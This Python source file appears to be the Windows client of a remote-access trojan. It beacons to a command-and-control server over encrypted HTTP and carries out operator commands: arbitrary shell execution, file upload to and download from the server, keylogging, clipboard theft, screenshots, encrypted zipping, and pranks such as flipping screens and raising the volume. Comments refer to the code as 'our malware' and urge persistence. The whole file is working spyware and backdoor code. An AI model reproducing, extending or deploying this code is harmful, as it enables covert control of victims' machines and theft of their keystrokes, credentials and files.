from encryption import cipher
from multiprocessing import freeze_support, Process
from os import chdir, getcwd, getenv, path
from PIL import Image, ImageGrab
from pynput.keyboard import Controller, Listener, Key
from pyperclip import paste, PyperclipWindowsException
from pyzipper import AESZipFile, WZ_AES, ZIP_LZMA
from requests import exceptions, get, post, put
from rotatescreen import get_displays
from settings import (C2_SERVER, CMD_REQUEST, CWD_RESPONSE, DELAY, FILE_REQUEST, FILE_SEND, HEADER, PORT, PROXY,
                      RESPONSE, RESPONSE_KEY, ZIP_PASSWORD)
from subprocess import PIPE, run, Popen, STDOUT
from sys import exit
from time import sleep, time
from winsound import PlaySound, SND_ASYNC


def run_job(os_command, count):

    try:
        with open(f"Job_{count}.txt", "w") as f_handle:
            process = Popen(os_command, shell=True, stdout=f_handle, stderr=f_handle)

            post_to_server(f"Job_{count} has started with pid: {process.pid}.\nUse the tasklist/taskkill command from"
                           f" windows to manage, if necessary.\nOutput from the job will be saved on the client in "
                           f"Job_{count}.txt.\n")
    except OSError:
        post_to_server(f"An OS Error occurred when attempting to write the job file.\n")


def post_to_server(message: str, response_path=RESPONSE):

    # Byte encode the message and then encrypt it before posting
    try:
        message = cipher.encrypt(message.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
             headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return


# This guard prevents our multiprocessing Process calls from running our main code below
if __name__ == "__main__":

    # Must use this if converting code to EXE via Pyinstaller
    freeze_support()

    def get_filename(input_string):

        output_string = " ".join(input_string.split()[2:]).replace("\\", "/")
        if output_string:
            return output_string
        else:
            post_to_server(f"You must enter a filename after {input_string}.\n")

    def on_press(key_press):
        """ This function records keys being pressed. It is called by the start method of pynput.keyboard's Listener """

        global key_log
        key_log.append(key_press)


    # The delay between re-connection attempts when the client is set inactive at the c2 server; set in settings.py
    delay = DELAY

    # Initializations that support background jobs, clipboard stealing, key-logging, and screenshots
    clip_count = 0
    jobs = []
    job_count = 0
    key_log = []
    listener = None
    shot_count = 0

    # Obtain unique identifying information
    client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
              str(time()))

    # UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encryption
    encrypted_client = cipher.encrypt(client.encode()).decode()

    # Try an HTTP GET request to the c2 server and retrieve a command; if it fails, keep trying
    while True:
        try:
            response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
            # print(client.split("@")[0], response.status_code)  # Use when troubleshooting

            # If we get a 404 status code from the server, raise an exception, so we can sleep and try again
            if response.status_code == 404:
                raise exceptions.RequestException
        except exceptions.RequestException:
            sleep(delay)
            continue

        # If we get a 204 status code from the server, simply re-iterate the loop with no sleep
        if response.status_code == 204:
            continue

        # Retrieve the command via the decrypted and decoded content of the response object
        command = cipher.decrypt(response.content).decode()

        # If the command starts with 'cd ', slice out directory and chdir to it
        if command.startswith("cd "):
            directory = command[3:]
            try:
                chdir(directory)
            except FileNotFoundError:
                post_to_server(f"{directory} was not found.\n")
            except NotADirectoryError:
                post_to_server(f"{directory} is not a directory.\n")
            except PermissionError:
                post_to_server(f"You do not have permissions to access {directory}.\n")
            except OSError:
                post_to_server("There was an operating system error on the client.\n")
            else:
                post_to_server(getcwd(), CWD_RESPONSE)

        # If command doesn't start with client, run an OS command and send the output to the c2 server
        elif not command.startswith("client "):

            # If the command doesn't end with ' &', then run it in the foreground; otherwise, run it in the background
            if not command.endswith(" &"):
                command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
                post_to_server(command_output.decode())
            else:
                # Right strip ' &' from the command
                command = command.rstrip(" &")

                # Start a background job using multiprocessing Process for the command that we entered
                jobs.append(Process(target=run_job, args=(command, job_count + 1,)))
                jobs[job_count].start()

                # Give our run_job function time to post status to our server before a new command GET request happens
                sleep(1)

                # Increment the counter in order to track our next job
                job_count += 1

        # The 'client download FILENAME' command allows us to transfer files to the client from our c2 server
        elif command.startswith("client download"):

            # Split out the filepath to download and replace \ with /
            filepath = get_filename(command)

            # If we had an Index Error, start a new iteration of the while loop
            if filepath is None:
                continue

            # Return the basename of filepath
            filename = path.basename(filepath)

            # UTF-8 encode the filename first to be able to encrypt it, but then we must decode it after the encryption
            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()

            # Use an HTTP GET request to stream the requested file from the c2 server
            try:
                with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER,
                         proxies=PROXY) as response:

                    # If the file was found, open it in binary mode and for writing
                    if response.status_code == 200:
                        with open(filename, "wb") as file_handle:

                            # Decrypt the response content and write the file out to disk, then notify us on the server
                            file_handle.write(cipher.decrypt(response.content))
                        post_to_server(f"{filename} is now on {client}.\n")
            except OSError:
                post_to_server(f"Unable to write {filename} to disk on {client}.\n")

        # The 'client upload FILENAME' command allows us to push files from the client to the c2 server
        elif command.startswith("client upload"):

            # Split out the filepath to download and replace \ with /
            filepath = get_filename(command)

            # If we had an Index Error, start a new iteration of the while loop
            if filepath is None:
                continue

            # Return the basename of filepath
            filename = path.basename(filepath)

            # Byte encode the filename first to be able to encrypt it, but then we must decode it after the encryption
            encrypted_filename = cipher.encrypt(filename.encode()).decode()

            # Read the file in and use it as the data argument for an HTTP PUT request to our c2 server
            try:
                with open(filepath, "rb") as file_handle:
                    encrypted_file = cipher.encrypt(file_handle.read())
                    put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file,
                        stream=True, proxies=PROXY, headers=HEADER)
            except OSError:
                post_to_server(f"Unable to access {filepath} on {client}.\n")

        # The 'client zip FILENAME' command allows us to zip-encrypt files on the client
        elif command.startswith("client zip"):

            # Split out the filepath to download and replace \ with /
            filepath = get_filename(command)

            # If we had an Index Error, start a new iteration of the while loop
            if filepath is None:
                continue

            # Return the basename of filepath
            filename = path.basename(filepath)

            # Zip file using AES encryption and LZMA compression method
            try:
                # Make sure we are not trying to zip a directory and that the file exists
                if path.isdir(filepath):
                    post_to_server(f"{filepath} on {client} is a directory.  Only files can be zipped.\n")
                elif not path.isfile(filepath):
                    raise OSError
                else:
                    with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                        zip_file.setpassword(ZIP_PASSWORD)
                        zip_file.write(filepath, filename)
                        post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
            except OSError:
                post_to_server(f"Unable to access {filepath} on {client}.\n")

        # The 'client unzip FILENAME' command allows us to unzip/decrypt files on the client
        elif command.startswith("client unzip"):

            # Split out the filepath to download and replace \ with /
            filepath = get_filename(command)

            # If we had an Index Error, start a new iteration of the while loop
            if filepath is None:
                continue

            # Return the basename of filepath
            filename = path.basename(filepath)

            # Unzip AES encrypted file using pyzipper
            try:
                with AESZipFile(filepath) as zip_file:
                    zip_file.setpassword(ZIP_PASSWORD)
                    zip_file.extractall(path.dirname(filepath))
                    post_to_server(f"{filepath} is now unzipped and decrypted on the client.\n")
            except OSError:
                post_to_server(f"{filepath} was not found on the client.\n")

        # The 'client kill' command will shut down our malware; make sure we have persistence!
        elif command == "client kill":
            exit()

        # The 'client delay SECONDS' command will change the delay time between inactive re-connection attempts
        elif command.startswith("client delay"):
            try:
                delay = float(command.split()[2])
                if delay < 0:
                    raise ValueError
            except (IndexError, ValueError):
                post_to_server("You must enter in a positive number in seconds for the delay.\n")
            else:
                post_to_server(f"{client} is now configured for a {delay} second delay when set inactive.\n")

        # The "client get clipboard" command will grab us a copy of the client's clipboard
        elif command == "client get clipboard":
            clip_count += 1

            # Grab the client's clipboard data and save it to disk
            with open(f"clipboard_{clip_count}.txt", "w") as file_handle:
                try:
                    file_handle.write(paste())
                except PyperclipWindowsException:
                    post_to_server(f"The computer is currently locked.  Can not get clipboard now.\n")
                except OSError:
                    post_to_server(f"There was an OS error when writing the clipboard data to disk.\n")
                else:
                    post_to_server(f"clipboard_{clip_count}.txt has been saved.\n")

        # The 'client keylog on' command starts a keylogger on the client
        elif command == "client keylog on":
            if listener is None:
                listener = Listener(on_press=on_press)
                listener.start()
                post_to_server("A keylogger is now running on the client.\n")
            else:
                post_to_server("A keylogger is already running on the client.\n")

        # The 'client keylog off' command will shut down the keylogger and write the results to disk
        elif command == "client keylog off":

            # Stop the listener and open Keys.log for appending our logged keys
            if listener is not None:
                listener.stop()
                try:
                    with open("Keys.log", "a") as file_handle:

                        # Read in each key and make it all a little more readable for us via some string replacements
                        for a_key_press in key_log:
                            file_handle.write(str(a_key_press).replace("Key.enter", "\n")
                                              .replace("'", "").replace("Key.space", " ")
                                              .replace('""', "'").replace("Key.shift_r", "")
                                              .replace("Key.shift_l", ""))

                        # Clear the key_log list and re-initialize the listener to signify "not on"
                        key_log.clear()
                        listener = None
                        post_to_server("Key logging is now disabled on the client. Results are in Keys.log\n")
                except OSError:
                    post_to_server("An OS error occurred while writing key log data to disk.\n")
            else:
                post_to_server("Key logging is not enabled on the client.\n")

        # The 'client type TEXT' command will type some text on the client's keyboard
        elif command.startswith("client type"):
            keyboard = None
            text = " ".join(command.split()[2:])
            if not text:
                post_to_server(f"You must enter some text to type on the client.\n")
            else:
                try:
                    keyboard = Controller()
                    keyboard.type(text)
                    post_to_server(f"Your message was typed on the client's keyboard.\n")
                except keyboard.InvalidCharacterException:
                    post_to_server(f"A non-typeable character was encountered.\n")

        # The 'client screenshot' command will grab us a copy of the client's screens
        elif command == "client screenshot":
            shot_count += 1
            screenshot = ImageGrab.grab(all_screens=True)
            screenshot.save(f"screenshot_{shot_count}.png")
            post_to_server(f"screenshot_{shot_count}.png has been saved.\n")

        # The 'client display IMAGE' command will display an image on the client's screen
        elif command.startswith("client display"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            try:
                image = Image.open(filepath)
                image.show()
                post_to_server(f"{filepath} is now displaying on the client.\n")
            except OSError:
                post_to_server(f"Unable to display {filepath} on {client}.\n")

        # The 'client flip screen' command will flip the user's screens upside down; run again to return to normal
        elif command == "client flip screen" or command == "client flip":
            screens = get_displays()
            for screen in screens:
                start_pos = screen.current_orientation
                screen.rotate_to(abs((start_pos - 180) % 360))

        # The 'client roll screen' command will roll the screen on each monitor the user is using
        elif command == "client roll screen" or command == "client roll":
            screens = get_displays()
            for screen in screens:
                start_pos = screen.current_orientation

                # Range end must be 5, 9, 13, 17, ...  in order for the screen to end up at the starting position
                for i in range(1, 9):
                    pos = abs((start_pos - i * 90) % 360)
                    screen.rotate_to(pos)

                    # Configure a delay between 90 deg. shifts
                    sleep(1.5)

        # The 'client max volume' command will crank the volume to 100% and be aware, the user may see it going up
        elif command == "client max volume" or command == "client max":
            keyboard = Controller()
            for i in range(50):
                keyboard.press(Key.media_volume_up)
                keyboard.release(Key.media_volume_up)

        # The 'client play FILENAME.wav' command can be used to play voice recordings or music on the client
        elif command.startswith("client play"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            try:
                # Make sure filepath exists and ends in .wav
                if path.isfile(filepath) and filepath.lower().endswith(".wav"):
                    PlaySound(filepath, SND_ASYNC)
                    post_to_server(f"{filepath} is now playing on the client.\n")
                else:
                    post_to_server(f"{filepath} was not found or the file doesn't end in .wav.\n")
            except OSError:
                post_to_server(f"Accessing {filepath} caused an OS error.\n")
